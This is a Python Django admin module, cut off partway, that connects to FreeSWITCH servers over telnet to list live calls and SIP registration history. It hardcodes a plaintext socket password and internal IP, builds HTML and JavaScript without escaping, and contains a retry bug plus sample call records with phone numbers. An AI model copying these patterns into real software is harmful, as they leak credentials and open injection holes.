# -*- coding=utf-8 -*-

from django.contrib import admin
from django.utils.translation import ugettext_lazy as _
from models import *
from lib.decorators import render_to, login_required
from django.contrib.admin.views.decorators import staff_member_required
from django.views.decorators.csrf import csrf_protect
from django.utils.decorators import method_decorator
import time
import telnetlib
import random
from django.http import HttpResponse
from django.contrib.auth.models import *
# from forms import AdminOnlineCallsFilter
from django.http import Http404
from settings import FREESWITCH, DATABASES
import os
import psycopg2
import psycopg2.extras
import socket
from django.conf.urls import patterns, url
import datetime

@staff_member_required
@render_to("admin/table.html")
def tester(request):
    print "a-a-a-"
    if request.user.is_superuser:
        context = {}
        channels = []
        ons = 0
        uons = 0
        for x in FREESWITCH:
            try:
                ons = 0
                uons = 0
                # buf_channels = []
                fs = telnet_login(FREESWITCH[x]['ESL_HOST'], FREESWITCH[x]['ESL_PORT'], FREESWITCH[x]['ESL_PASSWORD'])
                fs.write("api show calls\r\n\r\n")
                data = fs.read_until("total.", 10).splitlines()
                data = data[5:]

                pass
                # data = ['uuid,direction,created,created_epoch,name,state,cid_name,cid_num,ip_addr,dest,presence_id,presence_data,callstate,callee_name,callee_num,callee_direction,call_uuid,hostname,sent_callee_name,sent_callee_num,b_uuid,b_direction,b_created,b_created_epoch,b_name,b_state,b_cid_name,b_cid_num,b_ip_addr,b_dest,b_presence_id,b_presence_data,b_callstate,b_callee_name,b_callee_num,b_callee_direction,b_sent_callee_name,b_sent_callee_num,call_created_epoch', '2859a678-3c4f-11e1-a90c-6f69a8363855,inbound,2012-01-11 16:24:07,1326284647,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380780,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380780,SEND,2859a678-3c4f-11e1-a90c-6f69a8363855,debian-vm5,Outbound Call,78123380780,285dbf10-3c4f-11e1-a90d-6f69a8363855,outbound,2012-01-11 16:24:07,1326284647,sofia/internal/78123380780@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380780,,,ACTIVE,Outbound Call,78123380780,SEND,78126000468,78126000468,1326284657', '286efaa0-3c4f-11e1-a90e-6f69a8363855,inbound,2012-01-11 16:24:07,1326284647,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380880,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380880,SEND,286efaa0-3c4f-11e1-a90e-6f69a8363855,debian-vm5,Outbound Call,78123380880,2870220e-3c4f-11e1-a90f-6f69a8363855,outbound,2012-01-11 16:24:07,1326284647,sofia/internal/78123380880@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380880,,,ACTIVE,Outbound Call,78123380880,SEND,78126000468,78126000468,1326284657', '287e06ee-3c4f-11e1-a910-6f69a8363855,inbound,2012-01-11 16:24:07,1326284647,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380016,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380016,SEND,287e06ee-3c4f-11e1-a910-6f69a8363855,debian-vm5,Outbound Call,78123380016,287ff468-3c4f-11e1-a911-6f69a8363855,outbound,2012-01-11 16:24:07,1326284647,sofia/internal/78123380016@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380016,,,ACTIVE,Outbound Call,78123380016,SEND,78126000468,78126000468,1326284657', 'ba225122-3c4f-11e1-ab07-6f69a8363855,inbound,2012-01-11 16:28:12,1326284892,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380147,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380147,SEND,ba225122-3c4f-11e1-ab07-6f69a8363855,debian-vm5,Outbound Call,78123380147,ba25aeb2-3c4f-11e1-ab08-6f69a8363855,outbound,2012-01-11 16:28:12,1326284892,sofia/internal/78123380147@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380147,,,ACTIVE,Outbound Call,78123380147,SEND,78126000468,78126000468,1326284902', 'bac1e926-3c4f-11e1-ab0d-6f69a8363855,inbound,2012-01-11 16:28:13,1326284893,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380116,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380116,SEND,bac1e926-3c4f-11e1-ab0d-6f69a8363855,debian-vm5,Outbound Call,78123380116,bac3a25c-3c4f-11e1-ab0e-6f69a8363855,outbound,2012-01-11 16:28:13,1326284893,sofia/internal/78123380116@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380116,,,ACTIVE,Outbound Call,78123380116,SEND,78126000468,78126000468,1326284903', 'bad288ee-3c4f-11e1-ab0f-6f69a8363855,inbound,2012-01-11 16:28:13,1326284893,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380653,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380653,SEND,bad288ee-3c4f-11e1-ab0f-6f69a8363855,debian-vm5,Outbound Call,78123380653,bad3a6de-3c4f-11e1-ab10-6f69a8363855,outbound,2012-01-11 16:28:13,1326284893,sofia/internal/78123380653@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380653,,,ACTIVE,Outbound Call,78123380653,SEND,78126000468,78126000468,1326284903', '7d070a42-3c51-11e1-b0ca-6f69a8363855,inbound,2012-01-11 16:40:48,1326285648,sofia/internal/4996383003@195.94.225.2:5060,CS_EXECUTE,4996383003,4996383003,195.94.225.2,4996383059,4996383003@195.94.225.2,,ACTIVE,Outbound Call,74996383059,SEND,7d070a42-3c51-11e1-b0ca-6f69a8363855,debian-vm5,Outbound Call,74996383059,7d0bf23c-3c51-11e1-b0cb-6f69a8363855,outbound,2012-01-11 16:40:48,1326285648,sofia/internal/74996383059@46.61.162.242,CS_EXCHANGE_MEDIA,4996383003,4996383003,195.94.225.2,74996383059,,,ACTIVE,Outbound Call,74996383059,SEND,4996383003,4996383003,1326285658', 'a2efe8d2-3c51-11e1-b132-6f69a8363855,inbound,2012-01-11 16:41:52,1326285712,sofia/internal/4996383003@195.94.225.2:5060,CS_EXECUTE,4996383003,4996383003,195.94.225.2,4996383146,4996383003@195.94.225.2,,ACTIVE,Outbound Call,74996383146,SEND,a2efe8d2-3c51-11e1-b132-6f69a8363855,debian-vm5,Outbound Call,74996383146,a2f6233c-3c51-11e1-b133-6f69a8363855,outbound,2012-01-11 16:41:52,1326285712,sofia/internal/74996383146@46.61.162.242,CS_EXCHANGE_MEDIA,4996383003,4996383003,195.94.225.2,74996383146,,,ACTIVE,Outbound Call,74996383146,SEND,4996383003,4996383003,1326285722', 'c2af82fe-3c51-11e1-b187-6f69a8363855,inbound,2012-01-11 16:42:45,1326285765,sofia/internal/4999404222@195.94.225.2:5060,CS_EXECUTE,4999404222,4999404222,195.94.225.2,4996383124,4999404222@195.94.225.2,,ACTIVE,Outbound Call,74996383124,SEND,c2af82fe-3c51-11e1-b187-6f69a8363855,debian-vm5,Outbound Call,74996383124,c2b113bc-3c51-11e1-b188-6f69a8363855,outbound,2012-01-11 16:42:45,1326285765,sofia/internal/74996383124@46.61.162.242,CS_EXCHANGE_MEDIA,4999404222,4999404222,195.94.225.2,74996383124,,,ACTIVE,Outbound Call,74996383124,SEND,4999404222,4999404222,1326285775', 'e5338bae-3c51-11e1-b221-6f69a8363855,inbound,2012-01-11 16:43:43,1326285823,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380773,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380773,SEND,e5338bae-3c51-11e1-b221-6f69a8363855,debian-vm5,Outbound Call,78123380773,e534c488-3c51-11e1-b222-6f69a8363855,outbound,2012-01-11 16:43:43,1326285823,sofia/internal/78123380773@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380773,,,ACTIVE,Outbound Call,78123380773,SEND,78126000468,78126000468,1326285833', 'e53d79d4-3c51-11e1-b223-6f69a8363855,inbound,2012-01-11 16:43:43,1326285823,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380044,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380044,SEND,e53d79d4-3c51-11e1-b223-6f69a8363855,debian-vm5,Outbound Call,78123380044,e5400c58-3c51-11e1-b224-6f69a8363855,outbound,2012-01-11 16:43:43,1326285823,sofia/internal/78123380044@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380044,,,ACTIVE,Outbound Call,78123380044,SEND,78126000468,78126000468,1326285833', 'e54e2950-3c51-11e1-b225-6f69a8363855,inbound,2012-01-11 16:43:43,1326285823,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380210,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380210,SEND,e54e2950-3c51-11e1-b225-6f69a8363855,debian-vm5,Outbound Call,78123380210,e54fd372-3c51-11e1-b226-6f69a8363855,outbound,2012-01-11 16:43:43,1326285823,sofia/internal/78123380210@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380210,,,ACTIVE,Outbound Call,78123380210,SEND,78126000468,78126000468,1326285833', 'e551472a-3c51-11e1-b227-6f69a8363855,inbound,2012-01-11 16:43:43,1326285823,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380695,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380695,SEND,e551472a-3c51-11e1-b227-6f69a8363855,debian-vm5,Outbound Call,78123380695,e5521ba0-3c51-11e1-b228-6f69a8363855,outbound,2012-01-11 16:43:43,1326285823,sofia/internal/78123380695@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380695,,,ACTIVE,Outbound Call,78123380695,SEND,78126000468,78126000468,1326285833', 'e5ca7212-3c51-11e1-b229-6f69a8363855,inbound,2012-01-11 16:43:44,1326285824,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380193,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380193,SEND,e5ca7212-3c51-11e1-b229-6f69a8363855,debian-vm5,Outbound Call,78123380193,e5d01686-3c51-11e1-b22a-6f69a8363855,outbound,2012-01-11 16:43:44,1326285824,sofia/internal/78123380193@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380193,,,ACTIVE,Outbound Call,78123380193,SEND,78126000468,78126000468,1326285834', 'e5edd5a4-3c51-11e1-b22b-6f69a8363855,inbound,2012-01-11 16:43:44,1326285824,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380009,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380009,SEND,e5edd5a4-3c51-11e1-b22b-6f69a8363855,debian-vm5,Outbound Call,78123380009,e5f43b24-3c51-11e1-b22c-6f69a8363855,outbound,2012-01-11 16:43:44,1326285824,sofia/internal/78123380009@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380009,,,ACTIVE,Outbound Call,78123380009,SEND,78126000468,78126000468,1326285834', 'e5f4ceea-3c51-11e1-b22d-6f69a8363855,inbound,2012-01-11 16:43:44,1326285824,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380557,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380557,SEND,e5f4ceea-3c51-11e1-b22d-6f69a8363855,debian-vm5,Outbound Call,78123380557,e5f5d11e-3c51-11e1-b22e-6f69a8363855,outbound,2012-01-11 16:43:44,1326285824,sofia/internal/78123380557@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380557,,,ACTIVE,Outbound Call,78123380557,SEND,78126000468,78126000468,1326285834', 'e5fda2b8-3c51-11e1-b22f-6f69a8363855,inbound,2012-01-11 16:43:44,1326285824,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380837,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380837,SEND,e5fda2b8-3c51-11e1-b22f-6f69a8363855,debian-vm5,Outbound Call,78123380837,e5fee9e8-3c51-11e1-b230-6f69a8363855,outbound,2012-01-11 16:43:44,1326285824,sofia/internal/78123380837@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380837,,,ACTIVE,Outbound Call,78123380837,SEND,78126000468,78126000468,1326285834', 'e6051cc8-3c51-11e1-b231-6f69a8363855,inbound,2012-01-11 16:43:44,1326285824,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380552,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380552,SEND,e6051cc8-3c51-11e1-b231-6f69a8363855,debian-vm5,Outbound Call,78123380552,e6065610-3c51-11e1-b232-6f69a8363855,outbound,2012-01-11 16:43:44,1326285824,sofia/internal/78123380552@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380552,,,ACTIVE,Outbound Call,78123380552,SEND,78126000468,78126000468,1326285834', 'ea828baa-3c51-11e1-b23b-6f69a8363855,inbound,2012-01-11 16:43:52,1326285832,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380081,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380081,SEND,ea828baa-3c51-11e1-b23b-6f69a8363855,debian-vm5,Outbound Call,78123380081,ea847b72-3c51-11e1-b23c-6f69a8363855,outbound,2012-01-11 16:43:52,1326285832,sofia/internal/78123380081@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380081,,,ACTIVE,Outbound Call,78123380081,SEND,78126000468,78126000468,1326285842', 'f950f9e6-3c51-11e1-b277-6f69a8363855,inbound,2012-01-11 16:44:17,1326285857,sofia/internal/4994290862@195.94.225.2:5060,CS_EXECUTE,4994290862,4994290862,195.94.225.2,4996383148,4994290862@195.94.225.2,,ACTIVE,Outbound Call,74996383148,SEND,f950f9e6-3c51-11e1-b277-6f69a8363855,debian-vm5,Outbound Call,74996383148,f9531aaa-3c51-11e1-b278-6f69a8363855,outbound,2012-01-11 16:44:17,1326285857,sofia/internal/74996383148@46.61.162.242,CS_EXCHANGE_MEDIA,4994290862,4994290862,195.94.225.2,74996383148,,,ACTIVE,Outbound Call,74996383148,SEND,4994290862,4994290862,1326285867', '', '20 total.']
                if len(data) > 3:
                    headers = data[0].split(',')
                    headers.append("ip_freeswitch")
                    header_strings = (
                        'callee_num', 'name', 'ip_addr', 'b_ip_addr', 'dest', 'cid_num', 'cid_name', 'created', 'callstate', 'b_callstate', 'state', 'b_state', 'hostname', 'uuid', 'created_epoch', 'call_created_epoch', 'ip_freeswitch')
                    indexes = map(headers.index, header_strings)

                    assert all(x != -1 for x in indexes), \
                           "Unable to parse Freeswitch response"
                    for i in range(1, len(data) - 2):
                        values = data[i].split(',')
                        values.append(FREESWITCH[x]['ESL_HOST'])

                        channels.append(dict(
                            (header_strings[j], values[indexes[j]])
                            for j in range(len(header_strings))))
                    t = []
                    try:
                        ons += len(channels)
                        # context['ons'] += len(channels)
                    except Exception, e:
                        print e
                    for channel in channels:
                        # pdd += (int(channel['call_created_epoch']) - int(channel['created_epoch'])) if channel['created_epoch'] and channel['call_created_epoch'] else 0
                        channel['pdd'] = (int(channel['call_created_epoch']) - int(channel['created_epoch'])) if channel['created_epoch'] and channel['call_created_epoch'] else 0
                        # time_con += int(time.time() // 1)
                        channel['time'] = int(time.time() // 1)
                        channel['billsec'] = (int(time.time() // 1) - int(channel['call_created_epoch'])) if channel['call_created_epoch'] else 0
                        # billsec += (int(time.time() // 1) - int(channel['call_created_epoch'])) if channel['call_created_epoch'] else 0
                        if request.POST['filtr'] != "":
                            try:
                                if channel['callee_num'][0:len(request.POST['filtr'])] == request.POST['filtr']:
                                    if str(request.POST['filtr_ipfs']) != "1":
                                        if channel['ip_freeswitch'] == request.POST['filtr_ipfs']:
                                            if request.POST['filtr_who'] != "":
                                                if channel['cid_num'] == request.POST['filtr_who']:
                                                    t.append(channel)
                                            else:
                                                t.append(channel)
                                    else:
                                        t.append(channel)
                            except:
                                if channel['callee_num'] == "":
                                    t.append(channel)
                        elif str(request.POST['filtr_ipfs']) != '1':
                            if channel['ip_freeswitch'] == request.POST['filtr_ipfs']:
                                t.append(channel)
                        elif request.POST['filtr_who'] != "":
                            if channel['cid_num'] == request.POST['filtr_who']:
                                t.append(channel)
                    if request.POST['filtr'] != "":
                        channels = t
                        uons += len(t)
                    elif str(request.POST['filtr_ipfs']) != "1":
                        channels = t
                        uons += len(t)
                    else:
                        uons = ons
            except Exception, e:
                context['msg'] = "!!!!!!!!!!!!!!!!!!!!Could not get live calls: %s" % str(e)
                print context['msg']
            else:
                # channels=sorted(channels, key = lambda k: k[request.POST['sort']])
                context['channels'] = channels
#                print channels
#                print "lol"
        context['ons'] = ons
        context['uons'] = uons
        context['ids'] = request.POST['ids']
        context['ids2'] = request.POST['ids2']
        return context
    else:
        context = {}
        return context

csrf_protect_m = method_decorator(csrf_protect)

def telnet_login(host, port, password, log=False):

    """Функция устанавливает соединение по telnet
    логиниться и возвращает курсор подключения"""
    rcnt = True
    cc = 0
    while rcnt:
        try:
            print "Probyem CONNECTED"
            cc += 1
            if cc > 10:
                if log:
                    log.info("Количество попыток подключения исчерпано")
                return context
            tn = telnetlib.Telnet(host, port)
            if log:
                log.write(tn.read_until("SG login: ", 10))
            tn.write("auth " + password + "\r\n\r\n")
            tn.read_until("+OK accepted", 10)
            print "OK CONNECTED"
            rcnt = False
        except Exception, x:
            if log:
                log.info("Неполучилось подключитсья к железке: %s" % x)
            time.sleep(5)
    return tn



class sip_registrationsAdmin(admin.ModelAdmin):
    list_display = ('sip_user', 'sip_host', 'server_host', 'Time_exit', 'user_agent', 'status', 'call_id', 'network_ip')
    list_filter = ('server_host',)
    readonly_fields = ('call_id', 'sip_user', 'sip_host', 'sip_host', 'server_host', 'expires', 'user_agent', 'status', 'network_ip')
    fields = ('call_id', 'sip_user', 'sip_host', 'server_host', 'expires', 'user_agent', 'status', 'network_ip')
    search_fields = ('sip_user',)
    ordering = ('sip_user',)

    def has_add_permission(self, request):
        return False

#    def has_delete_permission(self, request, obj=None):
#        return False

    class Meta:
        app_label = "fsmanage"
        verbose_name = _("Registers")
        verbose_name_plural = _("Registers")

def Time_to_unixtime(tm):
    import time
    time_unix = int(time.mktime(time.strptime(str(tm), '%Y-%m-%d %H:%M:%S.%f')))
    return time_unix

@staff_member_required
@render_to("admin/history.html")
def show_history(request, arg):
    import math
    import datetime
    context = {}
    document = sip_registrations_history.objects.filter(sip_user=int(arg))
    print document
    context["document"] = document
    context["telnumber"] = document[0].sip_user
    dataset = []
    color_fs = {'176.124.137.231':'#92d5ea', '176.124.137.232':'#708090'}
    context["rawData_1"] = "var dataset = ["
    for x in document:
#        print x.expires
#        asdf = time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.localtime(x.expires))
#        asdf2 = int(time.mktime(time.strptime(str(asdf), '%a, %d %b %Y %H:%M:%S +0000')))
#        print asdf2
        xft = '%s000' % Time_to_unixtime(x.datetime)
        aft = '%s000' % x.expires
        a = int(xft)
        b = int(aft)
        dataset.append([a, b])
        #context["rawData_1"] += "[%s, 0],[%s,0]" % (a,b,)#92d5ea
        context["rawData_1"] += "{label: '%s', call_id: '%s', color: '%s', data: [[%s, 0],[%s,0]]}," % (x.server_host, x.call_id, color_fs[x.server_host],a + 14400000,b + 14400000,)



    context["rawData_1"] = context["rawData_1"].strip(',')  + '];'
    context["time_start_norm"] = time.strftime("%Y/%m/%d", time.localtime(Time_to_unixtime(document[0].datetime)))
    context["time_end_norm"] = time.strftime("%Y/%m/%d", time.localtime(document.reverse()[0].expires))

    #if context["time_start_norm"] == context["time_end_norm"]:
    timeList = list(time.localtime(document.reverse()[0].expires))
    timeList[2] += 1
    context["time_end_norm"] = time.strftime("%Y/%m/%d", timeList)

    context["request"] = request
    context["user"] = request.user
    context["title"] = _(u"History registrations of %s" % document[0].sip_user)
    context["csrf_token"] = request.COOKIES.get("csrftoken")
    context["app_label"] = "fsmanage"
    context["app_section"] = _(u"History registrations of %s" % document[0].sip_user)
    context["language"] = "ru"
    context["dataset"] = dataset
    return context

class sip_registrationshistoryAdmin(admin.ModelAdmin):
    list_display = ('tel_number', 'sip_host', 'server_host', 'Time_exit', 'user_agent', 'status', 'call_id', 'network_ip')
    list_filter = ('server_host',)
    readonly_fields = ('call_id', 'sip_user', 'sip_host', 'sip_host', 'server_host', 'expires', 'user_agent', 'status', 'network_ip')
    fields = ('call_id', 'sip_user', 'sip_host', 'server_host', 'expires', 'user_agent', 'status', 'network_ip')
    search_fields = ('sip_user',)

    def has_add_permission(self, request):
        return False

    def queryset(self, request):
        qs = super(sip_registrationshistoryAdmin, self).queryset(request)
        return qs.filter().order_by('sip_user').distinct('sip_user')

    def tel_number(self, obj):
        return '<a href="%s">%s</a>' % ('/admin/fsmanage/sip_registrations_history/%s/' % (obj.sip_user), obj.sip_user,)
    tel_number.allow_tags = True

    def get_urls(self):
        urls = super(sip_registrationshistoryAdmin, self).get_urls()
        my_urls = patterns('', ("^(.+)/$", show_history),)
        return my_urls + urls

    class Meta:
        app_label = "fsmanage"
        verbose_name = _("Registers")
        verbose_name_plural = _("Registers")


class FSCallsAdmin(admin.ModelAdmin):
    actions = None

    def has_add_permission(self, request):
        return False

    def has_delete_permission(self, request, obj=None):
        return False

    def queryset(self, request):
        return []

    META = {}
    notifications = {}

    @csrf_protect_m
    @render_to("admin/online_calls1.html")
    def changelist_view(self, request, extra_context=None):
        context = {}
        context["request"] = request
        context["user"] = request.user
        context["title"] = _(u"Online calls")
        context["csrf_token"] = request.COOKIES.get("csrftoken")
        context["app_label"] = "fsmanage"
        context["app_section"] = _(u"Online calls")
        context["language"] = "ru"

        self.user = request.user

        # form = AdminOnlineCallsFilter(request.GET)
        # context['form'] = form

        channels = []

        try:
#            print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
#            import ESL
#            ESL.eslSetLogLevel(7)
#            fs = ESL.ESLconnection("127.0.0.1", "8021", "ahbcdbnx e;t cnfhsq")
#            results = fs.sendRecv("api show calls")
#            data = results.getBody().splitlines()
#            print data
            fs = telnet_login("192.168.20.246", "8021", "ahbcdbnx yfv,th1")
            fs.write("api show calls\r\n\r\n")
            data = fs.read_until("total.", 10).splitlines()
            data = data[5:]
            pass
            # data = ['uuid,direction,created,created_epoch,name,state,cid_name,cid_num,ip_addr,dest,presence_id,presence_data,callstate,callee_name,callee_num,callee_direction,call_uuid,hostname,sent_callee_name,sent_callee_num,b_uuid,b_direction,b_created,b_created_epoch,b_name,b_state,b_cid_name,b_cid_num,b_ip_addr,b_dest,b_presence_id,b_presence_data,b_callstate,b_callee_name,b_callee_num,b_callee_direction,b_sent_callee_name,b_sent_callee_num,call_created_epoch', '2859a678-3c4f-11e1-a90c-6f69a8363855,inbound,2012-01-11 16:24:07,1326284647,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380780,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380780,SEND,2859a678-3c4f-11e1-a90c-6f69a8363855,debian-vm5,Outbound Call,78123380780,285dbf10-3c4f-11e1-a90d-6f69a8363855,outbound,2012-01-11 16:24:07,1326284647,sofia/internal/78123380780@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380780,,,ACTIVE,Outbound Call,78123380780,SEND,78126000468,78126000468,1326284657', '286efaa0-3c4f-11e1-a90e-6f69a8363855,inbound,2012-01-11 16:24:07,1326284647,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380880,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380880,SEND,286efaa0-3c4f-11e1-a90e-6f69a8363855,debian-vm5,Outbound Call,78123380880,2870220e-3c4f-11e1-a90f-6f69a8363855,outbound,2012-01-11 16:24:07,1326284647,sofia/internal/78123380880@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380880,,,ACTIVE,Outbound Call,78123380880,SEND,78126000468,78126000468,1326284657', '287e06ee-3c4f-11e1-a910-6f69a8363855,inbound,2012-01-11 16:24:07,1326284647,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380016,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380016,SEND,287e06ee-3c4f-11e1-a910-6f69a8363855,debian-vm5,Outbound Call,78123380016,287ff468-3c4f-11e1-a911-6f69a8363855,outbound,2012-01-11 16:24:07,1326284647,sofia/internal/78123380016@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380016,,,ACTIVE,Outbound Call,78123380016,SEND,78126000468,78126000468,1326284657', 'ba225122-3c4f-11e1-ab07-6f69a8363855,inbound,2012-01-11 16:28:12,1326284892,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380147,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380147,SEND,ba225122-3c4f-11e1-ab07-6f69a8363855,debian-vm5,Outbound Call,78123380147,ba25aeb2-3c4f-11e1-ab08-6f69a8363855,outbound,2012-01-11 16:28:12,1326284892,sofia/internal/78123380147@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380147,,,ACTIVE,Outbound Call,78123380147,SEND,78126000468,78126000468,1326284902', 'bac1e926-3c4f-11e1-ab0d-6f69a8363855,inbound,2012-01-11 16:28:13,1326284893,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380116,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380116,SEND,bac1e926-3c4f-11e1-ab0d-6f69a8363855,debian-vm5,Outbound Call,78123380116,bac3a25c-3c4f-11e1-ab0e-6f69a8363855,outbound,2012-01-11 16:28:13,1326284893,sofia/internal/78123380116@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380116,,,ACTIVE,Outbound Call,78123380116,SEND,78126000468,78126000468,1326284903', 'bad288ee-3c4f-11e1-ab0f-6f69a8363855,inbound,2012-01-11 16:28:13,1326284893,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380653,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380653,SEND,bad288ee-3c4f-11e1-ab0f-6f69a8363855,debian-vm5,Outbound Call,78123380653,bad3a6de-3c4f-11e1-ab10-6f69a8363855,outbound,2012-01-11 16:28:13,1326284893,sofia/internal/78123380653@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380653,,,ACTIVE,Outbound Call,78123380653,SEND,78126000468,78126000468,1326284903', '7d070a42-3c51-11e1-b0ca-6f69a8363855,inbound,2012-01-11 16:40:48,1326285648,sofia/internal/4996383003@195.94.225.2:5060,CS_EXECUTE,4996383003,4996383003,195.94.225.2,4996383059,4996383003@195.94.225.2,,ACTIVE,Outbound Call,74996383059,SEND,7d070a42-3c51-11e1-b0ca-6f69a8363855,debian-vm5,Outbound Call,74996383059,7d0bf23c-3c51-11e1-b0cb-6f69a8363855,outbound,2012-01-11 16:40:48,1326285648,sofia/internal/74996383059@46.61.162.242,CS_EXCHANGE_MEDIA,4996383003,4996383003,195.94.225.2,74996383059,,,ACTIVE,Outbound Call,74996383059,SEND,4996383003,4996383003,1326285658', 'a2efe8d2-3c51-11e1-b132-6f69a8363855,inbound,2012-01-11 16:41:52,1326285712,sofia/internal/4996383003@195.94.225.2:5060,CS_EXECUTE,4996383003,4996383003,195.94.225.2,4996383146,4996383003@195.94.225.2,,ACTIVE,Outbound Call,74996383146,SEND,a2efe8d2-3c51-11e1-b132-6f69a8363855,debian-vm5,Outbound Call,74996383146,a2f6233c-3c51-11e1-b133-6f69a8363855,outbound,2012-01-11 16:41:52,1326285712,sofia/internal/74996383146@46.61.162.242,CS_EXCHANGE_MEDIA,4996383003,4996383003,195.94.225.2,74996383146,,,ACTIVE,Outbound Call,74996383146,SEND,4996383003,4996383003,1326285722', 'c2af82fe-3c51-11e1-b187-6f69a8363855,inbound,2012-01-11 16:42:45,1326285765,sofia/internal/4999404222@195.94.225.2:5060,CS_EXECUTE,4999404222,4999404222,195.94.225.2,4996383124,4999404222@195.94.225.2,,ACTIVE,Outbound Call,74996383124,SEND,c2af82fe-3c51-11e1-b187-6f69a8363855,debian-vm5,Outbound Call,74996383124,c2b113bc-3c51-11e1-b188-6f69a8363855,outbound,2012-01-11 16:42:45,1326285765,sofia/internal/74996383124@46.61.162.242,CS_EXCHANGE_MEDIA,4999404222,4999404222,195.94.225.2,74996383124,,,ACTIVE,Outbound Call,74996383124,SEND,4999404222,4999404222,1326285775', 'e5338bae-3c51-11e1-b221-6f69a8363855,inbound,2012-01-11 16:43:43,1326285823,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380773,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380773,SEND,e5338bae-3c51-11e1-b221-6f69a8363855,debian-vm5,Outbound Call,78123380773,e534c488-3c51-11e1-b222-6f69a8363855,outbound,2012-01-11 16:43:43,1326285823,sofia/internal/78123380773@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380773,,,ACTIVE,Outbound Call,78123380773,SEND,78126000468,78126000468,1326285833', 